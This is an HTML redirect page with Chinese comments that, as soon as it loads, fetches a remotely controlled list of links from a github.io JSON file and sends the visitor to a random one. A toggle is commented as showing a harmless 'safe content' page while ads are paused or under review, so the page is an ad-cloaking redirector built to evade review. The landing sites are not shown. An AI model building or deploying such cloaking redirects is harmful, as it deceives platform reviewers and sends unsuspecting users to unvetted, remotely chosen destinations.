<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <script>
    // ------------------------------
    // 配置区域
    // ------------------------------
    const ENABLE_REDIRECT = true; // false = 广告暂停，显示安全内容页
    const MAIN_JSON_URL = "https://liuhongliang11895.github.io/888/mapping.json";
    const LOCAL_KEY = "lastActiveLinks";

    let activeLinks = [];

    // ------------------------------
    // 拉取主控仓库 JSON
    // ------------------------------
    async function fetchLinks() {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 3000);
        const res = await fetch(MAIN_JSON_URL + "?ts=" + Date.now(), {
          cache: "no-store",
          signal: controller.signal
        });
        clearTimeout(timeout);

        const data = await res.json();
        activeLinks = data.links.filter(l => l.active);

        if (!activeLinks.length) throw new Error("No active links available");

        // 缓存到 localStorage，用于 fallback
        localStorage.setItem(LOCAL_KEY, JSON.stringify(activeLinks));

      } catch (err) {
        console.error("Fetch failed:", err);
        // fallback：从上次缓存中随机选择
        activeLinks = JSON.parse(localStorage.getItem(LOCAL_KEY) || "[]");
      }
    }

    // ------------------------------
    // 随机跳转
    // ------------------------------
    function redirectUser() {
      if (!activeLinks.length) {
        document.body.innerHTML = "<h2>No active links available today.</h2>";
        return;
      }
      const idx = Math.floor(Math.random() * activeLinks.length);
      window.location.replace(activeLinks[idx].url);
    }

    // ------------------------------
    // 页面初始化
    // ------------------------------
    window.onload = async function() {
      if (!ENABLE_REDIRECT) {
        // 广告暂停或素材审核 → 显示安全内容页
        document.body.innerHTML = "<h2>Content temporarily unavailable.</h2><p>Please check back later.</p>";
        return;
      }

      // 拉取链接
      await fetchLinks();

      // ⚡ 立即跳转
      redirectUser();
    };
  </script>
</head>
<body>
  <p>Loading...</p>
</body>
</html>

